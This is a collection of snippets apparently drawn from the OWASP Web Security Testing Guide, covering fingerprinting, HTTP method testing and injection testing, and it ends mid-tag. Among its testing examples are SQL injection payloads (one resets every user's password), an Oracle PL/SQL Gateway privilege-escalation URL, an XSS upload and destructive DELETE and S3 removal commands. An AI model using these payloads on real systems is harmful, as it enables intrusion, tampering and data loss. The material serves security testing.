Response\nDESCRIPTION: Example of Nginx server response to a malformed HTTP request showing error handling and version information\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nGET / SANTA CLAUS/1.1\n\n\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.17.3</center>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Identifying ASP.NET Applications through ViewState Hidden Field\nDESCRIPTION: The __VIEWSTATE hidden field is a key indicator of Microsoft ASP.NET applications. It's used for maintaining state across postbacks in ASP.NET web forms.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_11\n\nLANGUAGE: text\nCODE:\n```\n__VIEWSTATE\n```\n\n----------------------------------------\n\nTITLE: Implementing JavaScript Injection Vulnerable Redirection\nDESCRIPTION: This JavaScript snippet demonstrates a redirection implementation that is vulnerable to JavaScript injection. It decodes the user input without proper validation, potentially allowing execution of arbitrary JavaScript code.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location=decodeURIComponent(redir);\n}\n```\n\n----------------------------------------\n\nTITLE: Malicious Input for Dynamic Reporting Query\nDESCRIPTION: Example of malicious user input that can exploit the vulnerable dynamic reporting query to perform unauthorized actions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\n1 from users; update users set password = 'password'; select *\n```\n\n----------------------------------------\n\nTITLE: Sending a Message with postMessage API in JavaScript\nDESCRIPTION: Example of sending a message to an iframe using the postMessage API, specifying the target origin as https://www.example.com.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\niframe1.contentWindow.postMessage(\"Hello world\",\"https://www.example.com\");\n```\n\n----------------------------------------\n\nTITLE: Extracting Hostnames from SSL/TLS Certificates Using OpenSSL\nDESCRIPTION: Command using OpenSSL to connect to an HTTPS server and extract hostnames from the certificate's Common Name and Subject Alternative Name fields, which can reveal additional virtual hosts.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\nopenssl s_client -connect 93.184.216.34:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n```\n\n----------------------------------------\n\nTITLE: Discovering Supported HTTP Methods with OPTIONS Request\nDESCRIPTION: Demonstrates how to use an OPTIONS request to discover supported HTTP methods on a web server. The server should respond with a list of allowed methods.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nOPTIONS / HTTP/1.1\nHost: example.org\n```\n\n----------------------------------------\n\nTITLE: Using Netcat to Examine HTTP Headers for Framework Identification\nDESCRIPTION: Example of using netcat to send a HEAD request and analyzing the HTTP response headers to identify the Mono framework from the X-Powered-By field.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono\n```\n\n----------------------------------------\n\nTITLE: OAuth Callback with Code Injection\nDESCRIPTION: Example of injecting authorization code into callback request\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nGET /callback?code=INJECT_CODE_HERE&state=example HTTP/1.1\nHost: client.example.com\n[...]\n\n```\n\n----------------------------------------\n\nTITLE: Analyzing Complex SQL Sub-Query for Injection\nDESCRIPTION: This SQL snippet demonstrates a complex query structure with a sub-query, which can complicate traditional UNION-based injection techniques. The vulnerability lies in the inner SELECT statement.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_20\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT \n  * \nFROM \n  customers \nWHERE \n  id IN (                 --\\\n    SELECT                   |\n      DISTINCT customer_id   |\n    FROM                     |\n      orders                 |--\\> vulnerable query\n    WHERE                    |\n      cost > 200             |\n  );                      --/\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Sequential User ID Format\nDESCRIPTION: Shows an example of sequentially created user IDs that could be easily guessed or enumerated.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCN000100\nCN000101\n...\n```\n\n----------------------------------------\n\nTITLE: Testing Simplified PATCH Method in RESTful API\nDESCRIPTION: Demonstrates a common (but technically incorrect) usage of the PATCH method, where the request body contains only the changed content instead of modification instructions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_12\n\nLANGUAGE: http\nCODE:\n```\nPATCH /api/users/foo HTTP/1.1\nHost: example.org\n\n{\n    \"role\": \"admin\"\n}\n```\n\n----------------------------------------\n\nTITLE: Example HTTP Response with Wildcard CORS Origin\nDESCRIPTION: An HTTP response header example showing a wildcard Access-Control-Allow-Origin setting. This configuration allows any domain to access the resource, which is insecure if the response contains sensitive information.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 4\nContent-Type: application/xml\n\n[Response Body]\n```\n\n----------------------------------------\n\nTITLE: SQL Injection with Inline Comments\nDESCRIPTION: Example of SQL injection using inline comments to bypass filters while maintaining valid SQL syntax.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md#2025-04-22_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\n'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--\n```\n\nLANGUAGE: sql\nCODE:\n```\n'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--\n```\n\n----------------------------------------\n\nTITLE: Specifying Non-Standard Ports in URL for Web Application Discovery\nDESCRIPTION: Shows how to reference a web application running on a non-standard port by including the port number in the URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nhttp[s]://www.example.com:port/\n\nhttps://www.example.com:20000/\n```\n\n----------------------------------------\n\nTITLE: Identifying Joomla CMS via Generator Meta Tag\nDESCRIPTION: HTML meta tag that indicates a website is powered by the Joomla content management system. This is one of the standard markers for Joomla-based websites.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" />\n```\n\n----------------------------------------\n\nTITLE: Querying CNAME Records with dig in Bash\nDESCRIPTION: This code snippet shows how to use the dig command to query CNAME records for a specific subdomain. The NXDOMAIN response indicates a potential vulnerability that requires further investigation.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ dig CNAME fictioussubdomain.victim.com\n; <<>> DiG 9.10.3-P4-Ubuntu <<>> ns victim.com\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 42950\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n```\n\n----------------------------------------\n\nTITLE: Testing Basic Authentication over HTTP using curl\nDESCRIPTION: This example demonstrates how to use curl to test for Basic Authentication being transmitted over unencrypted HTTP. The response shows the server requesting authentication credentials which would be sent in encoded (not encrypted) form.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -kis http://example.com/restricted/\nHTTP/1.1 401 Authorization Required\nDate: Fri, 01 Aug 2013 00:00:00 GMT\nWWW-Authenticate: Basic realm=\"Restricted Area\"\nAccept-Ranges: bytes Vary:\nAccept-Encoding Content-Length: 162\nContent-Type: text/html\n\n<html><head><title>401 Authorization Required</title></head>\n<body bgcolor=white> <h1>401 Authorization Required</h1>  Invalid login credentials!  </body></html>\n```\n\n----------------------------------------\n\nTITLE: Apache Server Response Headers\nDESCRIPTION: Example of HTTP response headers from an Apache web server showing version information and header structure\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \"75-591d1d21b6167\"\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n```\n\n----------------------------------------\n\nTITLE: Testing Numeric Parameter with Alphabetic Input\nDESCRIPTION: Example of an error message when providing alphabetic input to a parameter expecting a numeric value. This reveals the IMAP command structure and helps identify injection points.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md#2025-04-22_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\nERROR : Bad or malformed request.\nQuery: FETCH test:test BODY[HEADER]\nServer responded: Error in IMAP command received by server.\n```\n\n----------------------------------------\n\nTITLE: JavaScript Execution via getURL\nDESCRIPTION: Shows how getURL can be used to execute JavaScript in the same domain where the Flash movie is hosted.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md#2025-04-22_snippet_10\n\nLANGUAGE: actionscript\nCODE:\n```\ngetURL('javascript:evilcode','_self');\n```\n\n----------------------------------------\n\nTITLE: Enumerating Apache Admin Paths\nDESCRIPTION: List of Apache admin paths for security testing. These paths may provide access to Apache server status and configuration files.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n/index.html\n/httpd.conf\n/apache2.conf\n/server-status\n```\n\n----------------------------------------\n\nTITLE: Analyzing robots.txt Content Example from Google\nDESCRIPTION: An example snippet of a robots.txt file from Google showing User-agent directives and Disallow/Allow rules that specify which resources are prohibited or allowed for web crawlers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n```\n\n----------------------------------------\n\nTITLE: Detecting Conditional Administrative Links in JavaScript\nDESCRIPTION: JavaScript code that conditionally renders administrative functionality based on user privileges. This reveals the existence of administrative interfaces that may be directly accessible if the URL is known.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nvar adminUser=false;\nif (adminUser) menu.add (new menuItem (\"Maintain users\", \"/admin/useradmin.jsp\"));\n```\n\n----------------------------------------\n\nTITLE: Complex SQL Injection Exploit for Oracle PL/SQL Gateway\nDESCRIPTION: This example shows a sophisticated exploit that leverages SQL injection vulnerabilities in DBMS_EXPORT_EXTENSION to create a public synonym. This attack can lead to privilege escalation and complete control of the backend database.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_8\n\nLANGUAGE: txt\nCODE:\n```\nhttps://www.example.com/pls/dad/orasso.home?);\nexecute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20\nBUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20\nPUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';\nEND;--','SYS',1,'VER',0);END;\n```\n\n----------------------------------------\n\nTITLE: Lighttpd Malformed Request Response\nDESCRIPTION: Example of Lighttpd server response to a malformed HTTP request showing error handling and version information\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md#2025-04-22_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\nGET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         \"https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"https://www.w3.org/1999/xhtml/\" xml:lang=\"en\" lang=\"en\">\n <head>\n  <title>400 Bad Request</title>\n </head>\n <body>\n  <h1>400 Bad Request</h1>\n </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: HTTP Response Header with Obfuscated X-Powered-By Information\nDESCRIPTION: Example of an HTTP response where the X-Powered-By header has been customized to hide the actual framework, demonstrating why relying solely on this header can be unreliable.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears\n```\n\n----------------------------------------\n\nTITLE: Testing File Upload with cURL\nDESCRIPTION: Command to test if unauthorized users can upload files to cloud storage\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncurl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'\n```\n\n----------------------------------------\n\nTITLE: Referrer Header Example in OAuth Flow\nDESCRIPTION: Example of a referrer header that could potentially leak OAuth credentials. This snippet demonstrates how to identify the authorization server and client URL in the request history of an HTTP intercepting proxy.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nReferer: https://idp.example.com/\n```\n\n----------------------------------------\n\nTITLE: Verifying HTTP Service Using Telnet\nDESCRIPTION: Manual verification of a suspected HTTP service on port 8000 using telnet to send a GET request and examine the response headers, confirming it is indeed a web server.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]'.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n<html>\n...\n\n```\n\n----------------------------------------\n\nTITLE: XML Document Type Definition (DTD)\nDESCRIPTION: Presents a sample DTD that defines the structure of the XML document, which can be used to validate the XML and potentially prevent simple injection attacks.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<!DOCTYPE users [\n    <!ELEMENT users (user+) >\n    <!ELEMENT user (username,password,userid,mail+) >\n    <!ELEMENT username (#PCDATA) >\n    <!ELEMENT password (#PCDATA) >\n    <!ELEMENT userid (#PCDATA) >\n    <!ELEMENT mail (#PCDATA) >\n]>\n```\n\n----------------------------------------\n\nTITLE: Resulting XML Structure After Injection\nDESCRIPTION: Shows the XML structure that results from the injected tags, potentially granting administrative privileges to the injected user.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md#2025-04-22_snippet_7\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<users>\n    <user>\n        <username>gandalf</username>\n        <password>!c3</password>\n        <userid>0</userid>\n        <mail>gandalf@middleearth.com</mail>\n    </user>\n    <user>\n        <username>Stefan0</username>\n        <password>w1s3c</password>\n        <userid>500</userid>\n        <mail>Stefan0@whysec.hmm</mail>\n    </user>\n    <user>\n        <username>tony</username>\n        <password>Un6R34kb!e</password>\n        <userid>500</userid>\n        <mail>s4tan@hell.com</mail>\n        <userid>0</userid>\n        <mail>s4tan@hell.com</mail>\n    </user>\n</users>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Non-Standard Base URLs in Web Application Discovery\nDESCRIPTION: Illustrates how multiple web applications can be hosted under different paths on the same domain, potentially hiding their existence from standard enumeration techniques.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nhttps://www.example.com/app1\nhttps://www.example.com/app2\nhttps://www.example.com/app3\n```\n\n----------------------------------------\n\nTITLE: Server Response to OPTIONS Request\nDESCRIPTION: Shows an example server response to an OPTIONS request, listing the supported HTTP methods.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_1\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nAllow: OPTIONS, GET, HEAD, POST\n```\n\n----------------------------------------\n\nTITLE: Using cURL for DELETE Method\nDESCRIPTION: Shows how to use cURL to send a DELETE request, which can be used to test for file deletion vulnerabilities on legacy servers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://example.org/test.html -X DELETE\n```\n\n----------------------------------------\n\nTITLE: Oracle Server Response Headers\nDESCRIPTION: List of common server response headers that indicate the presence of Oracle PL/SQL Gateway and its various versions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nOracle-Application-Server-10g\nOracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server\nOracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server\nOracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)\nOracle-Application-Server-10g/9.0.4.0.0\nOracle HTTP Server Powered by Apache\nOracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a\nOracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d\nOracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e\nOracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e\nOracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c\nOracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b\nOracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0\nOracle_Web_Listener/4.0.7.1.0EnterpriseEdition\nOracle_Web_Listener/4.0.8.2EnterpriseEdition\nOracle_Web_Listener/4.0.8.1.0EnterpriseEdition\nOracle_Web_listener3.0.2.0.0/2.14FC1\nOracle9iAS/9.0.2 Oracle HTTP Server\nOracle9iAS/9.0.3.1 Oracle HTTP Server\n```\n\n----------------------------------------\n\nTITLE: Retrieving robots.txt Using curl\nDESCRIPTION: Command-line example using curl to retrieve the robots.txt file from Google's web server and display the first 5 lines, demonstrating how to obtain and begin analyzing a site's crawler instructions.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ curl -O -Ss https://www.google.com/robots.txt && head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n```\n\n----------------------------------------\n\nTITLE: AWS CLI Object Removal Command\nDESCRIPTION: Command to remove an object from an S3 bucket using AWS CLI\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md#2025-04-22_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\naws s3 rm s3://bucket-name/object-to-remove\n```\n\n----------------------------------------\n\nTITLE: Decoding JWT Header Example in JSON\nDESCRIPTION: Example of a decoded JWT header showing the algorithm (HS256) and token type. This represents the first component of a JWT that defines how the signature is calculated.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying API Keys in HTML Script Tags\nDESCRIPTION: Example of API keys (Google Maps and reCAPTCHA) hardcoded in an HTML script tag. These keys should be properly secured to prevent unauthorized usage.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage.md#2025-04-22_snippet_9\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"application/json\">\n...\n{\"GOOGLE_MAP_API_KEY\":\"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\", \"RECAPTCHA_KEY\":\"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\"}\n...\n</script>\n```\n\n----------------------------------------\n\nTITLE: Fuzzing with ffuf in Bash\nDESCRIPTION: Example command showing how to use ffuf for fuzzing a URL parameter. It uses a wordlist file 'userIDs.txt' to replace the 'FUZZ' placeholder in the target URL.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/6-Appendix/C-Fuzzing.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nffuf -w userIDs.txt -u https://example.com/view_photo?userId=FUZZ\n```\n\n----------------------------------------\n\nTITLE: Displaying IMAP Injection Error Response\nDESCRIPTION: Example of an error response when testing IMAP injection by providing a malformed input. The error reveals the underlying IMAP command structure.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md#2025-04-22_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\nERROR: Bad or malformed request.\nQuery: SELECT \"INBOX\"\"\nServer responded: Unexpected extra arguments to Select\n```\n\n----------------------------------------\n\nTITLE: Running GoBuster for Directory Bruteforcing\nDESCRIPTION: Shows how to use GoBuster to perform directory bruteforcing on a target URL using a specified wordlist file. This is a common technique for discovering hidden paths and files on web servers.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\ngobuster dir -u <target url> -w <wordlist file>\n```\n\n----------------------------------------\n\nTITLE: Testing PUT Method for File Upload\nDESCRIPTION: Demonstrates how to use the PUT method to attempt uploading a file to a legacy web server. This could potentially lead to arbitrary file upload if misconfigured.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nPUT /test.html HTTP/1.1\nHost: example.org\nContent-Length: 25\n\n<script>alert(1)</script>\n```\n\n----------------------------------------\n\nTITLE: Retrieving and Examining Google's sitemap.xml\nDESCRIPTION: Command-line example using wget to download Google's primary sitemap.xml file and view its first 8 lines, showing how to access a site's sitemap to discover the structure and available content.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ wget --no-verbose https://www.google.com/sitemap.xml && head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -> \"sitemap.xml\" [1]\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<sitemapindex xmlns=\"https://www.google.com/schemas/sitemap/0.84\">\n  <sitemap>\n    <loc>https://www.google.com/gmail/sitemap.xml</loc>\n  </sitemap>\n  <sitemap>\n    <loc>https://www.google.com/forms/sitemaps.xml</loc>\n  </sitemap>\n...\n```\n\n----------------------------------------\n\nTITLE: Testing DELETE Method Restriction\nDESCRIPTION: Example showing a DELETE request being blocked by the server with a 405 Method Not Allowed response, which is the expected behavior when a method is properly restricted.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md#2025-04-22_snippet_16\n\nLANGUAGE: http\nCODE:\n```\nDELETE /resource.html HTTP/1.1\nHost: example.org\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 405 Method Not Allowed\n[...]\n```\n\n----------------------------------------\n\nTITLE: List of Safe PL/SQL Procedures for Exploitation\nDESCRIPTION: This list contains examples of PL/SQL procedures that take no parameters and don't match entries in typical exclusion lists. These can be used as entry points for SQL injection attacks in Oracle applications.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md#2025-04-22_snippet_5\n\nLANGUAGE: txt\nCODE:\n```\nJAVA_AUTONOMOUS_TRANSACTION.PUSH\nXMLGEN.USELOWERCASETAGNAMES\nPORTAL.WWV_HTP.CENTERCLOSE\nORASSO.HOME\nWWC_VERSION.GET_HTTP_DATABASE_INFO\n```\n\n----------------------------------------\n\nTITLE: Identifying phpBB Forums via Body ID Attribute\nDESCRIPTION: HTML body tag pattern used to fingerprint phpBB forum software. The distinct ID attribute is a clear indicator of phpBB-powered forums.\nSOURCE: https://github.com/owasp/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md#2025-04-22_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<body 